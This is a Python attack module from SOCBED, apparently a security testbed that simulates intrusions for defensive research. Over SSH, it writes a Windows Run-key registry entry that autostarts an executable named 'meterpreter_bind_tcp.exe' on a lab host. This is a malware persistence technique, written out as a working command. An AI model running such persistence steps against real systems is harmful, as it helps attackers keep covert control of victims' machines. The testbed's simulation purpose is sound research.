# Copyright 2016-2021 Fraunhofer FKIE
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


from attacks import Attack, AttackInfo, AttackOptions


class SetAutostartAttackOptions(AttackOptions):
    data = "Data of the Registry Value"
    name = "Name of the Registry Value"
    rhost = "Target client host or IP address"

    def _set_defaults(self):
        self.data = "meterpreter_bind_tcp.exe"
        self.name = "Meterpreter Bind TCP"
        self.rhost = "192.168.56.101"


class SetAutostartAttack(Attack):
    info = AttackInfo(
        name="misc_set_autostart",
        description="Sets an autostart in the registry")
    options_class = SetAutostartAttackOptions

    def run(self):
        self._set_target()
        with self.check_printed("The operation completed successfully."):
            self.exec_command_on_target(self._autostart_command())

    def _set_target(self):
        self.ssh_client.target.hostname = self.options.rhost
        self.ssh_client.target.username = "ssh"

    def _autostart_command(self):
        return (
            "REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            "/v \"{name}\" /t REG_SZ /d \"{data}\" /f".format(
                name=self.options.name, data=self.options.data))
